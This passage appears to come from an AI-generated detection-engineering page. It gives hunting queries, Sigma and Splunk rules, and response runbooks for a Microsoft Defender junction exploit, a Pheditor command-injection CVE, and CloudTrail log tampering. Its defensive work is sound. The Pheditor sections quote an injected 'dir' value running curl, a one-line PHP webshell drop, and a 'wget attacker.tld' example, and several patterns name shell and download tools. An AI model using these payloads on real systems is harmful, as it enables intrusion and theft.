| project Timestamp, DeviceName, AccountName,
          ParentImage = InitiatingProcessFolderPath,
          ParentCmd   = InitiatingProcessCommandLine,
          ChildImage  = FolderPath,

          ProcessIntegrityLevel, SHA256
| order by Timestamp desc

| where NewProcessName endswith "\\cmd.exe"
| where TokenElevationType in ("%%1936", "%%1937") or SubjectUserSid =~ "S-1-5-18"
| project TimeGenerated, Computer, SubjectUserName, SubjectUserSid, ParentProcessName, NewProcessName, CommandLine, TokenElevationType
| order by TimeGenerated desc

Defender engine reads .vhd/.vhdx/.iso from remote SMB share (RoguePlanet RCE vector) AIDelivery Medium
The original RoguePlanet RCE chain required coercing the victim to open a .vhd(x) hosted on a remote SMB share, which Defender then scanned and overwrote its own files from. Hunts MsMpEng/mpengine reading disk-image extensions over UNC paths — the precursor to both the original RCE and the rewritten LPE. Rationale: Article: 'It required an attacker to coerce a victim to open a .vhd(x) in a remote SMB server, succesful exploitation resulted in defender overwriting its own files.' We pin to MsMpEng.exe (the Defender engine) reading those specific extensions over UNC. Even after the May mpengine!SysIO* hardening this is a useful hunt — the researcher rewrote the bug but the same delivery shape persists. Cross-checked against: • https://attack.mitre.org/techniques/T1080/ • https://attack.mitre.org/techniques/T1204/002/
ATT&CKT1204.002 T1080
Data sourcesEndpoint.Filesystem
Expected false positives · estimated rate: medium — model-assessed, tune to your environment
  • Legit VHD scanning when an analyst mounts an evidence image from a file-server share
  • Hyper-V hosts where checkpoint VHDs live on SMB and Defender scans them on access
  • SCCM / Intune deployment of VHDX-based gold images from a content share
  • Backup repositories on SMB where Defender real-time scan reaches into Veeam/Commvault VHDX vaults
Suppression filter
| where not(FolderPath has_any (@"\\\\sccm", @"\\\\intune", @"\\\\veeam", @"\\\\backup")) and not(InitiatingProcessCommandLine has "-SignatureUpdate")
Response runbook
Step 1 (triage): identify the remote share host (RequestSourceIP / UNC server) — is it a known fileserver, a workstation, or external? Verify the user account context and whether the user opened the VHDX deliberately (Explorer Recent items, ShellBags). Step 2 (contain): if the share host is unmanaged or external, block the UNC server at firewall and quarantine the VHDX file; collect Defender MpDetection/Operational logs. Step 3 (hunt): pivot to DeviceProcessEvents on the same DeviceId for MsMpEng.exe -> cmd.exe (UC1); look for NTFS junction creations under C:\\ProgramData\\Microsoft\\Windows Defender\\ (UC4); fleet-wide hunt for any host opening VHDX from the same UNC server.
DeviceFileEvents
| where Timestamp > ago(14d)
| where InitiatingProcessFileName =~ "MsMpEng.exe"
| where FolderPath startswith @"\\\\" or RequestProtocol =~ "SMB"
| where FileName has_any (".vhd", ".vhdx", ".iso", ".vmdk")
| project Timestamp, DeviceName, InitiatingProcessAccountName,
          InitiatingProcessFileName, FolderPath, FileName,
          RequestProtocol, RequestSourceIP, ShareName, SHA256
| order by Timestamp desc
ImFileEvent
| where TimeGenerated > ago(14d)
| where ActingProcessName has_any ("MsMpEng.exe", "mpengine")
| where TargetFilePath startswith @"\\\\"
| where TargetFileExtension in~ ("vhd", "vhdx", "iso", "vmdk")
| project TimeGenerated, DvcHostname, ActorUsername, ActingProcessName, ActingProcessCommandLine, TargetFilePath, TargetFileName, TargetFileExtension, TargetFileSHA256
| order by TimeGenerated desc

Host resolves or connects to projectnightcrawler.dev (RoguePlanet PoC repository) AIDelivery High
Nightmare Eclipse self-hosts the RoguePlanet PoC at projectnightcrawler.dev after GitHub/GitLab repo takedowns. Any internal host resolving or connecting to that domain is either a red-teamer pulling the PoC or an attacker stage-pulling — both warrant immediate review. Rationale: Article explicitly names projectnightcrawler.dev as Nightmare Eclipse's self-hosted PoC repository after GitHub/GitLab takedowns. This is the most concrete IOC the article gives us — single-event alerting is appropriate because no legitimate enterprise traffic should go there. Cross-checked: domain is currently registered (DNS TLD .dev requires HSTS / HTTPS so any traffic will be visible in proxy logs). Cross-checked against: • https://attack.mitre.org/techniques/T1588/005/ • https://www.bleepingcomputer.com/news/microsoft/microsoft-defender-rogueplanet-zero-day-grants-system-privileges/
ATT&CKT1105 T1588.005
Data sourcesNetwork_Resolution.DNS Network_Traffic.All_Traffic Web.Web
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Authorised red team / pentest pulling the PoC for sanctioned testing
  • Threat researchers on the security team browsing the writeup
  • Curious developers reading the article and clicking through to the repo from a corporate device
  • Sandbox / detonation infrastructure resolving the domain during URL analysis
Suppression filter
| where not(InitiatingProcessFileName in~ ("msedge.exe","chrome.exe","firefox.exe","brave.exe") and AccountName in~ ("securityteam-svc","redteam-svc"))
Response runbook
Step 1 (triage): identify the user account and process (browser vs scripting binary vs LOLBin). Browser hit by a known security analyst = informational; non-browser (curl/wget/powershell/bitsadmin) = high-priority. Capture the HTTP/HTTPS user-agent. Step 2 (contain): block projectnightcrawler.dev at the proxy / DNS sinkhole; preserve forensic copy of any downloaded archive from the host. Step 3 (hunt): for the same host, pivot to UC1 (MsMpEng->cmd) and UC2 (Defender reading remote VHDX) for evidence of actual exploitation; sweep email/Teams for the URL being shared internally.
union
(DeviceNetworkEvents
  | where Timestamp > ago(30d)
  | where RemoteUrl has "projectnightcrawler.dev"
  | project Timestamp, DeviceName, AccountName=InitiatingProcessAccountName,
            InitiatingProcessFileName, InitiatingProcessCommandLine,
            RemoteUrl, RemoteIP, RemotePort, Source="Network"),
(DeviceEvents
  | where Timestamp > ago(30d)
  | where ActionType == "DnsQueryResponse"
  | where AdditionalFields has "projectnightcrawler.dev"
  | project Timestamp, DeviceName, AccountName,
            InitiatingProcessFileName, InitiatingProcessCommandLine,
            RemoteUrl=tostring(parse_json(AdditionalFields).DnsQueryString),
            RemoteIP="", RemotePort=int(null), Source="DNS")
| order by Timestamp desc
union isfuzzy=true
(ImDnsActivity
  | where TimeGenerated > ago(30d)
  | where DnsQuery has "projectnightcrawler.dev"
  | project TimeGenerated, DvcHostname, SrcIpAddr, SrcUsername, DnsQuery, DnsResponseName, Source="DNS"),
(ImWebSession
  | where TimeGenerated > ago(30d)
  | where Url has "projectnightcrawler.dev" or HttpHostName has "projectnightcrawler.dev"
  | project TimeGenerated, DvcHostname=SrcHostname, SrcIpAddr, SrcUsername, Url, HttpHostName, HttpRequestHeaderUserAgent, Source="Web"),
(CommonSecurityLog
  | where TimeGenerated > ago(30d)
  | where RequestURL has "projectnightcrawler.dev" or DestinationHostName has "projectnightcrawler.dev"
  | project TimeGenerated, DvcHostname=SourceHostName, SrcIpAddr=SourceIP, SrcUsername=SourceUserName, Url=RequestURL, HttpHostName=DestinationHostName, Source="CEF")
| order by TimeGenerated desc

Junction or reparse point created targeting Defender ProgramData scan path AIExploitation Medium
The article states the bug class involves symlink/junction evaluation against files Defender scans — Microsoft 'silently hardened mpengine!SysIO* in mid-May' to block junction attacks. Hunts creation of NTFS junctions/reparse points that target the Defender scan/quarantine directory tree, the substrate for both the original and rewritten RoguePlanet exploits. Rationale: Article: 'Microsoft silently hardened Defender in mid-May by patching mpengine!SysIO* API, which blocked junction attacks.' This UC catches the unpatched path and any rewritten variant the researcher mentions remains 'soul-draining' to weaponise. Combination of junction-creation LOLBins + path predicate restricted to Defender directories keeps FP rate manageable. Cross-checked against: • https://attack.mitre.org/techniques/T1574/005/ • https://learn.microsoft.com/en-us/sysinternals/downloads/junction
ATT&CKT1574.005 T1068
Data sourcesEndpoint.Processes Endpoint.Filesystem
Expected false positives · estimated rate: medium — model-assessed, tune to your environment
  • Microsoft engineers debugging mpengine on Insider/Canary builds (the article notes researcher tested on Canary)
  • Sysadmin redirecting Defender quarantine to a different volume via documented junction procedure
  • AV migration scripts that junction the old Defender path to a new install location
  • Forensic tools (KAPE, Velociraptor) cloning Defender Operational logs via junction
Suppression filter
| where not(InitiatingProcessFileName in~ ("ccmexec.exe","intunemanagementextension.exe","setupact.log") or AccountName endswith "$") and not(ProcessCommandLine has_any ("KAPE","velociraptor"))
Response runbook
Step 1 (triage): identify the creating account and parent process — interactive admin via cmd is suspicious; SCCM/Intune/automation service is more likely benign. Validate the target of the junction with `fsutil reparsepoint query` on the artifact path. Step 2 (contain): if the junction points to an attacker-writable directory, isolate the host and remove the reparse point; capture MFT + USN journal for the volume; verify KB5094126 + post-disclosure mpengine version on the host. Step 3 (hunt): on the same host correlate with UC1 (SYSTEM cmd from MsMpEng), UC2 (Defender reading VHDX on SMB), and DeviceFileEvents for any write to mpengine.dll or its signature databases.
DeviceProcessEvents
| where Timestamp > ago(30d)
| where FileName in~ ("cmd.exe","powershell.exe","pwsh.exe","fsutil.exe")
| where ProcessCommandLine has_any ("mklink /J","mklink /D","fsutil reparsepoint","New-Item -ItemType SymbolicLink","New-Item -ItemType Junction")
| where ProcessCommandLine has_any (@"\ProgramData\Microsoft\Windows Defender", @"\Program Files\Windows Defender", "mpengine", "MsMpEng")
| project Timestamp, DeviceName, AccountName, InitiatingProcessFileName,
          FileName, ProcessCommandLine, ProcessIntegrityLevel
| order by Timestamp desc
SecurityEvent
| where TimeGenerated > ago(30d)
| where EventID == 4688
| where NewProcessName has_any ("\\cmd.exe","\\powershell.exe","\\pwsh.exe","\\fsutil.exe")
| where CommandLine has_any ("mklink /J","mklink /D","fsutil reparsepoint","New-Item -ItemType SymbolicLink","New-Item -ItemType Junction")
| where CommandLine has_any (@"\ProgramData\Microsoft\Windows Defender", @"\Program Files\Windows Defender", "mpengine", "MsMpEng")
| project TimeGenerated, Computer, SubjectUserName, ParentProcessName, NewProcessName, CommandLine, TokenElevationType
| order by TimeGenerated desc
title: NTFS Junction/Reparse Point Targeting Microsoft Defender Path (RoguePlanet)
id: 0a4f7c92-3d1e-4b6a-8e9c-2d8b1f4e90a1
description: Detects creation of NTFS junctions or symbolic links whose target is the Defender ProgramData/Program Files tree — the symlink-evaluation substrate the RoguePlanet (CVE-2026-33825) chain abuses.
references:
  - https://www.bleepingcomputer.com/news/microsoft/microsoft-defender-rogueplanet-zero-day-grants-system-privileges/
author: SOC
date: 2026/06/10
tags:
  - attack.t1574.005
  - attack.t1068
logsource:
  category: process_creation
  product: windows
detection:
  selection_tool:
    Image|endswith:
      - '\cmd.exe'
      - '\powershell.exe'
      - '\pwsh.exe'
      - '\fsutil.exe'
  selection_cmd:
    CommandLine|contains:
      - 'mklink /J'
      - 'mklink /D'
      - 'fsutil reparsepoint'
      - 'New-Item -ItemType SymbolicLink'
      - 'New-Item -ItemType Junction'
  selection_target:
    CommandLine|contains:
      - '\ProgramData\Microsoft\Windows Defender'
      - '\Program Files\Windows Defender'
      - 'mpengine'
      - 'MsMpEng'
  condition: selection_tool and selection_cmd and selection_target
level: high
source:(windows.security OR windows.sysmon) (@EventID:4688 OR @EventID:1) @Image:(*\\cmd.exe OR *\\powershell.exe OR *\\pwsh.exe OR *\\fsutil.exe) @CommandLine:((*"mklink /J"* OR *"mklink /D"* OR *"fsutil reparsepoint"* OR *"New-Item -ItemType SymbolicLink"* OR *"New-Item -ItemType Junction"*) AND (*"\\ProgramData\\Microsoft\\Windows Defender"* OR *"\\Program Files\\Windows Defender"* OR *mpengine* OR *MsMpEng*))
#event_simpleName=ProcessRollup2
| ImageFileName=/(cmd|powershell|pwsh|fsutil)\.exe$/i
| regex("(?i)(mklink\\s+/[JD]|fsutil\\s+reparsepoint|New-Item\\s+-ItemType\\s+(SymbolicLink|Junction))", field=CommandLine)
| regex("(?i)(\\\\ProgramData\\\\Microsoft\\\\Windows Defender|\\\\Program Files\\\\Windows Defender|mpengine|MsMpEng)", field=CommandLine)
| groupBy([aid, ComputerName, UserName, ImageFileName, CommandLine], function=count())
ENDPOINT
Toggle if your env has no CIM data-model acceleration.
| tstats `summariesonly` count min(_time) as firstTime max(_time) as lastTime from datamodel=Endpoint.Processes where (Processes.process_name="cmd.exe" OR Processes.process_name="powershell.exe" OR Processes.process_name="pwsh.exe" OR Processes.process_name="fsutil.exe" OR Processes.process_name="mklink.exe") (Processes.process="*mklink /J*" OR Processes.process="*mklink /D*" OR Processes.process="*fsutil reparsepoint*" OR Processes.process="*New-Item*-ItemType SymbolicLink*" OR Processes.process="*New-Item*-ItemType Junction*") (Processes.process="*\\ProgramData\\Microsoft\\Windows Defender*" OR Processes.process="*\\ProgramFiles\\Windows Defender*" OR Processes.process="*mpengine*") by Processes.dest Processes.user Processes.parent_process_name Processes.process | `drop_dm_object_name(Processes)` | `security_content_ctime(firstTime)` | `security_content_ctime(lastTime)`
| tstats summariesonly=false count min(_time) as firstTime max(_time) as lastTime from datamodel=Endpoint.Processes where (Processes.process_name="cmd.exe" OR Processes.process_name="powershell.exe" OR Processes.process_name="pwsh.exe" OR Processes.process_name="fsutil.exe" OR Processes.process_name="mklink.exe") (Processes.process="*mklink /J*" OR Processes.process="*mklink /D*" OR Processes.process="*fsutil reparsepoint*" OR Processes.process="*New-Item*-ItemType SymbolicLink*" OR Processes.process="*New-Item*-ItemType Junction*") (Processes.process="*\\ProgramData\\Microsoft\\Windows Defender*" OR Processes.process="*\\ProgramFiles\\Windows Defender*" OR Processes.process="*mpengine*") by Processes.dest Processes.user Processes.parent_process_name Processes.process | `drop_dm_object_name(Processes)` | `security_content_ctime(firstTime)` | `security_content_ctime(lastTime)`

Data sourcesVulnerabilities DeviceInfo DeviceTvmSoftwareVulnerabilities
// TVM tables are daily snapshots — pin a 1-day window so the engine
// partitions on Timestamp instead of scanning the full retention.
DeviceTvmSoftwareVulnerabilities
| where Timestamp > ago(1d)
| where CveId in~ ("CVE-2026-33825")
| join kind=inner (DeviceInfo | where Timestamp > ago(1d)) on DeviceId
| project DeviceName, OSPlatform, CveId, VulnerabilitySeverityLevel, RecommendedSecurityUpdate
| order by VulnerabilitySeverityLevel asc, DeviceName asc

// Sentinel has no native TVM table. If MDE→Sentinel streaming is enabled,
// `DeviceTvmSoftwareVulnerabilities` is available. Otherwise this UC has
// no Sentinel translation — track via Update / Heartbeat OS-version
// gaps as a coarse approximation.
DeviceTvmSoftwareVulnerabilities
| where TimeGenerated > ago(1d)
| where CveId in~ ("CVE-2026-33825")
| join kind=inner (DeviceInfo | where TimeGenerated > ago(1d)) on DeviceId
| project DeviceName, OSPlatform, CveId,
          VulnerabilitySeverityLevel, RecommendedSecurityUpdate
| order by VulnerabilitySeverityLevel asc, DeviceName asc

Toggle if your env has no CIM data-model acceleration.
| tstats `summariesonly` count min(_time) as firstTime max(_time) as lastTime
    from datamodel=Vulnerabilities

PHP webserver process spawning shell/network utility (Pheditor CVE-2026-48030 RCE) AIExploitation High
Detects PHP webserver workers (php-fpm/apache2/nginx) spawning sh, curl, wget, or nc as the www-data identity — the canonical post-RCE execution signal for OS command injection in Pheditor's terminal handler via the unsanitized 'dir' POST parameter. Catches both the immediate PoC `curl ifconfig.me` exfil and the `echo ... > shell.php` webshell drop. Rationale: Article specifies vulnerable code is in pheditor.php at /var/www/html running as www-data (PoC step 5 output: uid=33(www-data)). PoC steps 4 and 5 both exec curl from the PHP context — the strongest behavioural pivot. Pairs the exact parent set (php-fpm/apache2/nginx) with the abused child set (sh/curl/wget) and constrains by the web identity to drop FPs.
ATT&CKT1190 T1059.004 T1505.003
Data sourcesEndpoint.Processes
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Legitimate PHP web apps that legitimately shell out to ImageMagick (`convert`), ffmpeg, or pdftotext via system()/exec()
  • Mail-delivery PHP apps invoking /usr/sbin/sendmail or msmtp as www-data
  • Container healthcheck scripts using curl to probe /health endpoints from the same www-data identity
  • Composer or npm scripts run under the webserver user during in-place deploys
  • Drupal/WordPress cron (wp-cron.php) invoking curl for outbound webhook delivery
Suppression filter
| where not (ChildCmd has_any ("/etc/alternatives/sendmail","/usr/sbin/sendmail","-t -i","msmtp","/usr/bin/convert ","ffmpeg ","pdftotext","localhost/health","127.0.0.1"))
| where not (InitiatingProcessParentFileName in~ ("cron","crond","systemd"))
Response runbook
Step 1 — Triage: pivot to the ChildCmd to confirm intent. `curl https://ifconfig.me` or `wget attacker.tld` is hostile; `sendmail -t` is benign. Pull surrounding DeviceProcessEvents on the same DeviceId ±2 minutes to reconstruct the parent web request and any sibling shell drops. Step 2 — Contain: if hostile, isolate the host (Defender Live Response or equivalent), kill the parent php-fpm worker PID, and capture /var/www and /tmp for forensics before patching. Pin Pheditor to a fixed version (>2.0.3) or remove terminal permission in pheditor config. Step 3 — Hunt: pivot UC2 (webshell write) on the same DeviceId since incident start; pivot DeviceNetworkEvents for outbound connections from php-fpm/apache2/nginx to non-corporate IPs over the last 30 days; review IIS/Apache access logs for prior POSTs to pheditor.php from the same SourceIP.
DeviceProcessEvents
| where Timestamp > ago(7d)
| where InitiatingProcessFileName has_any ("php-fpm","php-fpm7.4","php-fpm8.0","php-fpm8.1","php-fpm8.2","apache2","httpd","nginx","php")
| where FileName in~ ("sh","bash","dash","curl","wget","nc","ncat","python","python3","perl")
| where InitiatingProcessAccountName in~ ("www-data","apache","nginx","httpd","nobody","daemon")
| project Timestamp, DeviceName, AccountName=InitiatingProcessAccountName,
          ParentImage=InitiatingProcessFolderPath,
          ParentCmd=InitiatingProcessCommandLine,
          ChildImage=FolderPath, ChildCmd=ProcessCommandLine, SHA256
| order by Timestamp desc
ImProcessCreate
| where TimeGenerated > ago(7d)
| where ParentProcessName has_any ("php-fpm","apache2","httpd","nginx","php")
| where ActingProcessName has_any ("/sh","/bash","/dash","/curl","/wget","/nc","/ncat","/python","/python3","/perl")
| where ActorUsername in~ ("www-data","apache","nginx","httpd","nobody","daemon")
| project TimeGenerated, DvcHostname, ActorUsername,
          ParentProcessName, ParentProcessCommandLine,
          ActingProcessName, ActingProcessCommandLine
| order by TimeGenerated desc

description: PHP webserver worker (php-fpm/apache2/nginx) spawning sh/curl/wget/nc as the web user — post-RCE execution signal for Pheditor CVE-2026-48030 'dir' parameter injection or similar PHP-based command-injection RCE.
references:
  - https://github.com/advisories/GHSA-jvc5-6g7q-c843
author: SOC Detection Engineering
date: 2026/06/10
tags:
  - attack.execution
  - attack.t1190
  - attack.t1059.004
  - attack.t1505.003

  category: process_creation
  product: linux
detection:
  selection_parent:
    ParentImage|endswith:
      - '/php-fpm'
      - '/php-fpm7.4'
      - '/php-fpm8.0'
      - '/php-fpm8.1'
      - '/php-fpm8.2'
      - '/apache2'
      - '/httpd'
      - '/nginx'
  selection_child:
    Image|endswith:
      - '/sh'

      - '/curl'

PHP webserver writing .php file to webroot (Pheditor webshell drop) AIInstallation High
Detects a PHP webserver worker writing or modifying a .php file inside a webroot path (/var/www, /srv/www, /usr/share/nginx, inetpub/wwwroot) under the www-data identity — matches the Pheditor PoC step 5 webshell deployment (`echo '<?php system($_GET[\"c\"]);?>' > /var/www/html/shell.php`). Legitimate .php files are deployed by deploy tooling, not by the webserver itself. Rationale: PoC step 5 literally writes `/var/www/html/shell.php` from the php-fpm context. Three high-fidelity anchors: writer process (php-fpm/apache2/nginx), file extension (.php), and target path (webroot). Webshells are almost never deployed via the webserver's own identity in healthy environments — deploy tooling runs as a deploy user or root.
ATT&CKT1505.003 T1190
Data sourcesEndpoint.Filesystem
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • WordPress / Drupal / Joomla auto-update writing plugin or theme .php files via the webserver user
  • Composer post-install scripts triggered through a web-driven deploy hook regenerating vendor/autoload.php
  • PHP-based CMSs (e.g. ProcessWire, October CMS) compiling .php template caches into /var/www/cache
  • Webroot symlink updates during atomic blue/green deploys where the webserver user owns /var/www/current
  • Legitimate Pheditor file-create operations by a real admin saving a .php file through the editor UI
Suppression filter
| where not (FileName matches regex @"^(autoload|autoload_real|autoload_static|autoload_classmap|autoload_files|autoload_namespaces|autoload_psr4)\.php$")
| where not (FolderPath has_any ("/wp-content/upgrade/","/sites/default/files/php/twig/","/var/www/cache/","/storage/framework/views/"))
Response runbook
Step 1 — Triage: pull the file via Live Response, grep for `system(`, `passthru(`, `shell_exec(`, `eval(`, `base64_decode(`, or short single-letter $_GET/$_POST params — webshell tell. Cross-reference the InitiatingProcessCommandLine for the originating HTTP request path (often visible in php-fpm worker cmdline). Step 2 — Contain: rm the dropped file, restart php-fpm to flush opcache, isolate the host, and rotate any DB/API creds reachable from /var/www/.env. Patch Pheditor to a fixed release or disable terminal permission. Step 3 — Hunt: rerun this query org-wide back 90 days to find prior drops; pivot DeviceNetworkEvents on the offending DeviceId for callbacks from www-data; check W3CIISLog/Apache access logs for GETs to the dropped filename with single-char query params (`?c=`, `?cmd=`, `?x=`).
DeviceFileEvents
| where Timestamp > ago(7d)
| where ActionType in ("FileCreated","FileModified","FileRenamed")
| where FileName endswith ".php"
| where InitiatingProcessFileName has_any ("php-fpm","apache2","httpd","nginx","php")
| where FolderPath has_any ("/var/www/","/srv/www/","/usr/share/nginx/","/var/html/","\\inetpub\\wwwroot\\")
| where InitiatingProcessAccountName in~ ("www-data","apache","nginx","httpd","nobody","daemon")
| project Timestamp, DeviceName, FolderPath, FileName, SHA256, FileSize,
          InitiatingProcessFileName, InitiatingProcessCommandLine,
          InitiatingProcessAccountName,
          InitiatingProcessParentFileName
| order by Timestamp desc
ImFileEvent
| where TimeGenerated > ago(7d)
| where EventType in ("FileCreated","FileModified")
| where TargetFileExtension =~ "php"
| where ActingProcessName has_any ("php-fpm","apache2","httpd","nginx","php")
| where TargetFilePath has_any ("/var/www/","/srv/www/","/usr/share/nginx/","\\inetpub\\wwwroot\\")
| where ActorUsername in~ ("www-data","apache","nginx","httpd","nobody","daemon")
| project TimeGenerated, DvcHostname, TargetFilePath, TargetFileName,
          TargetFileSHA256, ActingProcessName, ActingProcessCommandLine,
          ActorUsername
| order by TimeGenerated desc

HTTP POST to pheditor.php with action=terminal and shell metacharacters in body AIDelivery Medium
Hunts for HTTP POSTs to the vulnerable pheditor.php endpoint carrying `action=terminal` with shell metacharacters (`;`, `|`, backtick, `$(`) in the `dir` parameter — the exact exploit shape for CVE-2026-48030. Useful where WAF or reverse-proxy logs capture POST bodies; falls back to inventorying any POST to pheditor.php for vulnerable-version asset discovery. Rationale: Article explicitly names pheditor.php and action=terminal as the targeted endpoint/parameter and lists `;`, `&&`, `||` as the metacharacters that bypass the whitelist via the `dir` field (PoC step 4: `dir=/tmp; curl -s https://ifconfig.me #`). The URL-encoded variants (%3B, %7C, %26%26, %24%28) cover encoded payloads. Where WAF body inspection isn't available, the IIS inventory branch still surfaces vulnerable-version assets in scope for asset management.
ATT&CKT1190 T1059.004
Data sourcesWeb.Web
Expected false positives · estimated rate: medium — model-assessed, tune to your environment
  • Legitimate Pheditor admins using the terminal feature with a directory path that happens to contain a semicolon (rare on Linux but possible)
  • Vulnerability scanners (Nessus, Qualys, Nuclei) sending CVE-2026-48030 probes against your perimeter
  • Internal red-team or pentest exercises with prior authorization
  • WAF audit-mode logging legitimate admin traffic with body content
  • Asset-discovery scripts hitting /pheditor.php to fingerprint deployed versions
Suppression filter
| where SrcIP !in ("<asset-scanner-ip-1>","<asset-scanner-ip-2>")
| where not (DstHost has_any ("staging.","dev.","test.") and SrcIP startswith "10.")
Response runbook
Step 1 — Triage: identify whether the source IP is a known scanner, internal admin, or external unknown. Pull the cookies header to confirm authenticated session (TPID `pheditor_password=` was set), then check the WAF/proxy response code — `{"error":false,"message":"OK"}` in 200 OK = successful exploitation. Step 2 — Contain: if external + successful, block the source IP at the edge, revoke the abused pheditor session and rotate credentials, then patch Pheditor past 2.0.3 or disable terminal permission. Step 3 — Hunt: feed the DestinationHostName into UC1 + UC2 queries for follow-on RCE/webshell signals on the corresponding host within ±10 minutes; cross-reference SourceIP against threat intel and other web app traffic.
// Try WAF first (CommonSecurityLog often captures POST body)
let WafHits = CommonSecurityLog
    | where TimeGenerated > ago(7d)
    | where RequestURL has "pheditor.php"
    | where RequestMethod =~ "POST"
    | extend Body = strcat(tostring(Message), " ", tostring(DeviceCustomString1), " ", tostring(DeviceCustomString2), " ", tostring(RequestContext))
    | where Body has "action=terminal"
    | where Body matches regex @"dir=[^&]*([;|`]|%3[Bb]|%7[Cc]|%26%26|%24%28|\$\()"
    | project TimeGenerated, SrcIP=SourceIP, DstHost=DestinationHostName, RequestURL, RequestMethod, BodySnippet=substring(Body,0,2000), DeviceVendor, DeviceProduct;
// Fall back to IIS inventory (no POST body) for asset discovery
let IisHits = W3CIISLog
    | where TimeGenerated > ago(7d)
    | where csUriStem endswith "pheditor.php"
    | where csMethod =~ "POST"
    | project TimeGenerated, SrcIP=cIP, DstHost=Computer, RequestURL=csUriStem, RequestMethod=csMethod, BodySnippet="(IIS does not log POST body)", DeviceVendor="IIS", DeviceProduct="W3CIISLog";
union WafHits, IisHits
| order by TimeGenerated desc
source:(nginx.access OR apache.access OR nginx OR apache) @http.url_details.path:*pheditor.php* @http.method:POST

    by Filesystem.dest, Filesystem.user, Filesystem.process_name,
       Filesystem.file_path, Filesystem.file_name
| `drop_dm_object_name(Filesystem)`
``` Article-specific bespoke detection — [GHSA / CRITICAL] CVE-2026-48030: Pheditor: OS Command Injection in terminal han ```

Detected
Reconnaissance. Attacker researches the target — OSINT, scanning, enumeration.
Weaponization. Coupling exploit code with deliverable payload (e.g. weaponized PDF/Office doc, trojanized installer).
Delivery. Transmitting the weapon (phishing email, USB, watering hole, drive-by, malicious ad). → Phishing-link click correlated to endpoint execution · Email attachment opened from external sender
Exploitation. Triggering the exploit — vulnerability/macro/trust abuse to execute code. → Office app spawning script/LOLBin child process · Trusted vendor binary / installer launching unusual children
Installation. Establishing persistence on the host — backdoor, service, scheduled task, registry key.
Command & Control. Beacon to attacker infrastructure for control and tasking.
Actions on Objectives. Lateral movement, credential dumping, data theft, ransomware, sabotage. → [LLM] AWS CloudTrail StopLogging — trail disabled via API · [LLM] AWS S3 bucket deletion targeting a CloudTrail log destination · [LLM] GCP Cloud Logging sink disabled via UpdateSink · [LLM] GCP log bucket deletion entering DELETE_REQUESTED state
AWS CloudTrail StopLogging — trail disabled via API AIActions on Objectives High
Detects an attacker (or insider) invoking the cloudtrail:StopLogging API to suspend log delivery to S3, creating a CloudTrail visibility gap. This is the single highest-fidelity blind-the-watchmen signal called out by Unit 42 and maps to MITRE T1562.008. Successful StopLogging calls in production are vanishingly rare outside of break-glass / planned maintenance. Rationale: Article explicitly names the cloudtrail:StopLogging permission and stop-logging API as Technique 1; the API name is the exact CloudTrail eventName emitted, making this a high-fidelity single-event detection. MITRE T1562.008 page corroborates StopLogging as a primary disable-cloud-logs sub-technique. Cross-checked against: • https://attack.mitre.org/techniques/T1562/008/
ATT&CKT1562.008
Data sourcesChange.All_Changes
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Planned CloudTrail decommissioning by cloud-engineering during account consolidation
  • Terraform / CloudFormation drift remediation that recreates a trail (stop → delete → create sequence)
  • Break-glass operator pausing logging during a sensitive migration
  • Automation rotating from a legacy single-region trail to a new org-trail
  • Cost-control script disabling redundant per-account trails after org-trail deployment
Suppression filter
| where UserIdentityArn !contains "break-glass" and UserIdentityArn !contains "terraform-deploy" and UserAgent !startswith "aws-cloudformation"
Response runbook
Step 1 — Triage: pull the IAM principal (userIdentity.arn / sessionIssuer.userName) and source IP; confirm via the change ticket / CAB whether StopLogging was authorized and verify if MFA was used (additionalEventData.MFAUsed). Step 2 — Contain: immediately re-enable the trail (StartLogging), rotate the calling principal's access keys, and revoke any active sessions for the role. If unauthorized, isolate that principal's permissions and snapshot the IAM policy chain that granted cloudtrail:StopLogging. Step 3 — Hunt: pivot on the same arn / sessionContext for ±60 minutes — look for DeleteTrail, DeleteBucket, PutBucketPolicy, GuardDuty disable, IAM CreateUser/AttachUserPolicy, and any cross-region API activity. Treat StopLogging as the start of a kill chain, not the end.
AWSCloudTrail
| where TimeGenerated > ago(7d)
| where EventName == "StopLogging"
| where isempty(ErrorCode)
| extend TrailArn = tostring(parse_json(RequestParameters).name)
| project TimeGenerated, EventName, UserIdentityArn, UserIdentityType, SourceIpAddress, UserAgent, AWSRegion, TrailArn, RecipientAccountId
| order by TimeGenerated desc

AWS S3 bucket deletion targeting a CloudTrail log destination AIActions on Objectives High
Detects DeleteBucket against an S3 bucket that was the destination for one or more CloudTrail trails, typically preceded by DeleteObject calls to empty the bucket (Unit 42 Technique 2). Destroys forensic evidence and breaks the audit chain. Correlates the bucket-deletion event with the trail-configuration error/notification that follows. Rationale: Article (Technique 2, Figure 2) calls out the exact s3:DeleteBucket + s3:DeleteObject permission pair and the resulting CloudTrail configuration notification. Joining DeleteBucket against the known CloudTrail-destination-bucket set (DescribeTrails / CreateTrail history) is what turns generic bucket deletion into a targeted log-destruction detection. Cross-checked against: • https://attack.mitre.org/techniques/T1562/008/
ATT&CKT1485 T1562.008
Data sourcesChange.All_Changes
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Account decommissioning workflow tears down trail + destination bucket in sequence
  • Cost-cleanup script deletes a stale ‘dev’ CloudTrail bucket nobody noticed had a trail attached
  • Terraform destroy on a tenant-isolated logging stack during environment rollback
  • Migration from in-account trail to org-trail leaves the old destination bucket orphaned and removed
  • Backup/forensics tooling cycling a quarantine bucket that happens to share a naming pattern
Suppression filter
| where UserAgent !startswith "aws-cloudformation" and UserAgent !startswith "terraform" and UserIdentityArn !contains "account-decom"
Response runbook
Step 1 — Triage: confirm the deleted bucket was an active CloudTrail destination via CloudTrail config history and any S3 inventory/Config snapshots; capture the principal arn, session, source IP and check MFA usage. Step 2 — Contain: revoke the calling principal's session, attach an explicit Deny for s3:DeleteBucket/s3:DeleteObject on logging buckets, and engage AWS Support if Object Lock / versioning could recover the bucket contents. Step 3 — Hunt: pivot on the principal for StopLogging, DeleteTrail, PutBucketPolicy (S3 ACL weakening) and PutEventSelectors (selector tampering) in the surrounding window; if the trail was the only org log sink, treat the period between last delivered log and detection as a blind window requiring out-of-band forensics (VPC Flow, GuardDuty, third-party network telemetry).
let trail_buckets = AWSCloudTrail
    | where TimeGenerated > ago(30d)
